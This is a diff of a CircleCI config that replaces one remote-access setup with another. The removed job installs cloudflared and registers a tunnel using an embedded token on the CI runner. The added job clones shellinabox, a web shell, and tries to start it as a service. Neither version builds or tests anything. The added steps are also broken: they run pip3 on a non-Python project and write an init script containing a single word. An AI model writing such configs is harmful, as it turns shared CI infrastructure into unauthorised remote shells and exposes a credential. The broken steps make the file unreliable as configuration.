@@ -1,30 +1,30 @@
 version: 2.1
 
 jobs:
-  build-and-run:
+  setup:
     docker:
-      - image: hlohaus789/g4f:latest
+      - image: cimg/base:stable
     steps:
       - checkout
       - run:
-          name: Install CloudFlare
+          name: Install SiaX
           command: |
-            echo "Installing CloudFlare..."
-            curl -L --output cloudflared.deb https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
-            sudo dpkg -i cloudflared.deb
-            sudo apt-get update
-            sudo apt-get install net-tools
-            sudo cloudflared service install eyJhIjoiMWE1MTc4MTE0YTZjOWZmNDllMzZiNmMxNzVlOTZiYjkiLCJ0IjoiMjYzOTZhNWMtYmMzOC00NjZlLThiMDgtMDNjZWM4Njg5ODFmIiwicyI6IlltTmhNRGs1WTJZdE5EaGhaQzAwTVRRNUxUZ3hOVGd0Tm1GaE16ZzBZemxqTkdZMiJ9
-            sudo netstat -tulpn | grep LISTEN
-      - store_artifacts:
-          path: .
-          destination: artifacts
+            git clone https://github.com/shellinabox/shellinabox.git
+            cd shellinabox
+            pip3 install .
+      - run:
+          name: Configure SiaX
+          command: |
+            mkdir -p /var/www/html
+            echo "shellinaboxd" > /etc/init.d/shellinaboxd
+            chmod +x /etc/init.d/shellinaboxd
+      - run:
+          name: Start SiaX
+          command: |
+            service shellinaboxd start
 
 workflows:
   version: 2
-  build-and-run:
+  build_and_test:
     jobs:
-      - build-and-run:
-          filters:
-            branches:
-              only: main
+      - setup
